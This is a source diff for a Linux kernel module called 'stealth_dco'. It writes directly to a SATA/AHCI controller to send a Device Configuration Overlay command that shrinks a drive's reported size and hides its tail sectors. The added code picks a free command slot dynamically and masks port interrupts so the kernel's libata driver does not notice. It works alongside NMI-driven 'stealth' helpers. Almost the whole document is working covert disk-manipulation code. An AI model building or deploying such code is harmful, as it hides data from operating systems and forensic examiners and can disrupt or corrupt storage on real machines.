@@ -1,8 +1,14 @@
 #include "stealth_dco.h"
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/io.h>
+#include <linux/types.h>
+#include <linux/bitrev.h>
+#include <linux/pci.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("System Researcher");
-MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module with NMI-Driven APIC Pipeline");
+MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module with Dynamic Slot Scanner, NMI-Driven APIC Pipeline, and PxIE Blinding");
 
 /* External declarations from apic_stealth.c */
 extern int __init init_apic_stealth_subsystem(void);
@@ -10,26 +16,52 @@ extern void cleanup_apic_stealth_subsystem(void);
 extern void trigger_nmi_execution(void);
 extern void stealth_sanitize_and_flush(void *addr, size_t size);
 
+/**
+ * scan_for_available_slot - Dynamically scans PxCI and available slots to find a safe index
+ */
+static int scan_for_available_slot(void __iomem *port_base)
+{
+    u32 ci_status;
+    int i;
+
+    ci_status = readl(port_base + 0x38); // PxCI offset
+    
+    pr_info("[STEALTH_DCO] [*] Scanning command slots. Current PxCI status: 0x%08x\n", ci_status);
+
+    /* Search for a completely idle slot in the lower/mid range (slots 1 to 30) */
+    for (i = 1; i < 31; i++) {
+        if (!(ci_status & (1U << i))) {
+            pr_info("[STEALTH_DCO] [+] Selected available command slot index: %d\n", i);
+            return i;
+        }
+    }
+
+    /* Fallback to slot 1 if all checked slots are busy */
+    pr_warn("[STEALTH_DCO] [!] All target slots active; falling back to slot 1\n");
+    return 1;
+}
+
 static int __init ahci_stealth_dco_init(void)
 {
     void __iomem *abar_base = NULL;
     void *port_base = NULL;
     void __iomem *slot0_virt = NULL;
-    void __iomem *slot31_virt = NULL;
+    void __iomem *slot_target_virt = NULL;
     void __iomem *ctba_virt = NULL;
     void __iomem *data_virt = NULL;
 
     struct sata_fis_h2d    *fis;
-    struct ahci_cmd_header *hdr0, *hdr31;
-    struct ahci_prdt_entry *prdt0, *prdt31;
+    struct ahci_cmd_header *hdr0, *hdr_target;
+    struct ahci_prdt_entry *prdt0, *prdt_target;
 
-    u64 lst_phys = 0, slot0_ctba_phys = 0, slot31_ctba_phys = 0, data_phys = 0;
-    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val;
+    u64 lst_phys = 0, slot0_ctba_phys = 0, slot_target_ctba_phys = 0, data_phys = 0;
+    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val, old_pxie;
+    int target_slot = 0;
     int ret = 0;
     u8 *sector_buf;
 
     pr_info("[STEALTH_DCO] ==================================================\n");
-    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + NMI APIC STEALTH START -----------\n");
+    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + NMI APIC STEALTH (PXIE BLINDED) ---\n");
     pr_info("[STEALTH_DCO] ==================================================\n");
 
     /* 1. Initialize Persistent APIC & LVT Blinding Subsystem */
@@ -50,11 +82,13 @@ static int __init ahci_stealth_dco_init(void)
 
     /* 3. Execute Hardware Audits and Asynchronous NMI Trigger */
     execute_method2_onchip_mmio_audit(abar_base);
-    u8 target_bus = 0;
-    u8 target_dev = 31;
-    u8 target_fn  = 0;
-
-    suppress_interrupts_adaptive(target_bus, target_dev, target_fn);    
+    {
+        u8 target_bus = 0;
+        u8 target_dev = 31;
+        u8 target_fn  = 0;
+        suppress_interrupts_adaptive(target_bus, target_dev, target_fn);
+    }
+    
     /* Fire out-of-band execution via Local APIC NMI trap */
     trigger_nmi_execution();
 
@@ -77,9 +111,13 @@ static int __init ahci_stealth_dco_init(void)
     writel(cmd_val, (char *)port_base + AHCI_PxCMD);
     wmb();
 
+    /* 4. Dynamically Choose an Available Slot */
+    target_slot = scan_for_available_slot(port_base);
+
+    /* Map Slot 0 and the dynamically chosen target slot */
     slot0_virt = manual_direct_map(lst_phys + (0 * 32));
-    slot31_virt = manual_direct_map(lst_phys + (31 * 32));
-    if (!slot0_virt || !slot31_virt) {
+    slot_target_virt = manual_direct_map(lst_phys + (target_slot * 32));
+    if (!slot0_virt || !slot_target_virt) {
         pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
         ret = -EFAULT;
         goto out_abar;
@@ -88,18 +126,18 @@ static int __init ahci_stealth_dco_init(void)
     hdr0 = (struct ahci_cmd_header *)slot0_virt;
     slot0_ctba_phys = ((u64)hdr0->ctbau << 32) | hdr0->ctba;
 
-    hdr31 = (struct ahci_cmd_header *)slot31_virt;
-    slot31_ctba_phys = ((u64)hdr31->ctbau << 32) | hdr31->ctba;
+    hdr_target = (struct ahci_cmd_header *)slot_target_virt;
+    slot_target_ctba_phys = ((u64)hdr_target->ctbau << 32) | hdr_target->ctba;
 
-    if (!slot0_ctba_phys || !slot31_ctba_phys) {
+    if (!slot0_ctba_phys || !slot_target_ctba_phys) {
         pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
         ret = -EFAULT;
         goto out_abar;
     }
 
-    ctba_virt = manual_direct_map(slot31_ctba_phys);
+    ctba_virt = manual_direct_map(slot_target_ctba_phys);
     if (!ctba_virt) {
-        pr_err("[STEALTH_DCO] FATAL: Failed to map slot 31 CTBA\n");
+        pr_err("[STEALTH_DCO] FATAL: Failed to map target slot CTBA\n");
         ret = -EFAULT;
         goto out_abar;
     }
@@ -120,8 +158,19 @@ static int __init ahci_stealth_dco_init(void)
     memset((void *)ctba_virt, 0, 256);
     memset((void *)data_virt, 0, 512);
 
-    /* Phase 1: Inspect Tail Sector */
-    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) ---\n", (unsigned long long)TARGET_INSPECT_LBA);
+    /* ------------------------------------------------------------------------
+     * BLINDING SETUP: Temporarily mask port interrupts (PxIE @ offset 0x14)
+     * to prevent libata from processing asynchronous state changes.
+     * ------------------------------------------------------------------------ */
+    old_pxie = readl((char *)port_base + 0x14);
+    writel(0, (char *)port_base + 0x14);
+    wmb();
+
+    /* ------------------------------------------------------------------------
+     * PHASE 1: Inspect Tail Sector (Targeting Dynamic Slot)
+     * ------------------------------------------------------------------------ */
+    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) via Slot %d ---\n", 
+            (unsigned long long)TARGET_INSPECT_LBA, target_slot);
     fis = (struct sata_fis_h2d *)ctba_virt;
     fis->fis_type    = 0x27;
     fis->pm_port_c   = 0x80;
@@ -135,18 +184,19 @@ static int __init ahci_stealth_dco_init(void)
     fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
     fis->count_low   = 0x01;
 
-    prdt31 = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
-    prdt31->dba  = (u32)(data_phys & 0xFFFFFFFF);
-    prdt31->dbau = (u32)(data_phys >> 32);
-    prdt31->dbc  = (511 & 0x3FFFFF);
+    prdt_target = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
+    prdt_target->dba  = (u32)(data_phys & 0xFFFFFFFF);
+    prdt_target->dbau = (u32)(data_phys >> 32);
+    prdt_target->dbc  = (511 & 0x3FFFFF);
 
-    hdr31->dw0   = (5 & 0x1F) | (1 << 16); 
-    hdr31->dw1   = 0;
-    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
-    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
+    hdr_target->dw0   = (5 & 0x1F) | (1 << 16); 
+    hdr_target->dw1   = 0;
+    hdr_target->ctba  = (u32)(slot_target_ctba_phys & 0xFFFFFFFF);
+    hdr_target->ctbau = (u32)(slot_target_ctba_phys >> 32);
     wmb();
 
-    if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
+    ret = execute_ahci_slot_stealth(port_base, target_slot, false);
+    if (ret == 0) {
         sector_buf = (u8 *)data_virt;
         if (*(u64 *)sector_buf == 0x5452415020494645ULL) {
             pr_warn("[STEALTH_DCO] [+] GPT Backup Header detected at tail boundary.\n");
@@ -155,11 +205,14 @@ static int __init ahci_stealth_dco_init(void)
         }
     } else {
         ret = -EIO;
-        goto out_abar;
+        goto restore_pxie;
     }
 
-    /* Phase 2: DCO Micro-Trim */
-    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) ---\n", (unsigned long long)STEALTH_MAX_LBA);
+    /* ------------------------------------------------------------------------
+     * PHASE 2: DCO Micro-Trim (Targeting Dynamic Slot)
+     * ------------------------------------------------------------------------ */
+    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) via Slot %d ---\n", 
+            (unsigned long long)STEALTH_MAX_LBA, target_slot);
     memset((void *)ctba_virt, 0, 256);
     fis = (struct sata_fis_h2d *)ctba_virt;
     fis->fis_type    = 0x27;
@@ -173,24 +226,31 @@ static int __init ahci_stealth_dco_init(void)
     fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
     fis->count_low   = 0x01;
 
-    hdr31->dw0   = (5 & 0x1F) | (0 << 16); 
-    hdr31->dw1   = 0;
-    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
-    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
+    hdr_target->dw0   = (5 & 0x1F) | (0 << 16); 
+    hdr_target->dw1   = 0;
+    hdr_target->ctba  = (u32)(slot_target_ctba_phys & 0xFFFFFFFF);
+    hdr_target->ctbau = (u32)(slot_target_ctba_phys >> 32);
     wmb();
 
-    if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
+    ret = execute_ahci_slot_stealth(port_base, target_slot, true);
+    if (ret == 0) {
         pxis_after = readl((char *)port_base + AHCI_PxIS);
         if (pxis_after & PxIS_TFES) {
             pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
             ret = -EIO;
         } else {
-            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via Method 2/4 and NMI pipeline.\n");
+            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via Slot %d and NMI pipeline.\n", target_slot);
             ret = 0;
         }
     } else {
         ret = -EIO;
     }
+
+restore_pxie:
+    /* Clear any pending status flags and restore original PxIE mask */
+    writel(0xFFFFFFFF, (char *)port_base + 0x10); // Clear PxIS
+    writel(old_pxie, (char *)port_base + 0x14);
+    wmb();
 
 out_abar:
     if (abar_base)
